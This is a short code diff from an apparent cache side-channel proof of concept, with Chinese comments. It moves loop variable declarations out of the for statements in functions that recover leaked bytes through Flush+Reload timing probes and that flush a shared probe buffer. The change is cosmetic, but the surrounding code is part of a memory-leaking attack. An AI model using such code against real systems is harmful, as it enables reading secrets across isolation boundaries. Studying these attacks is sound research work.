@@ -480,7 +480,8 @@ void cache_encode(char data)
 // 从cache中恢复单个数据
 char cache_decode()
 {
-    for (int i = 0; i < 256; i++)
+    int i;
+    for (i = 0; i < 256; i++)
     {
         int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
         if (flush_reload(mem + mix_i * pagesize))
@@ -498,7 +499,8 @@ char cache_decode()
 // 从cache中恢复字符数组
 void cache_decode_array(char *leaked, int index)
 {
-    for (int i = 0; i < 256; i++)
+    int i;
+    for (i = 0; i < 256; i++)
     {
         int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
         if (flush_reload(mem + mix_i * pagesize))
@@ -514,7 +516,8 @@ void cache_decode_array(char *leaked, int index)
 // 清理cache
 void flush_shared_memory()
 {
-    for (int j = 0; j < 256; j++)
+    int j;
+    for (j = 0; j < 256; j++)
     {
         flush(mem + j * pagesize);
     }
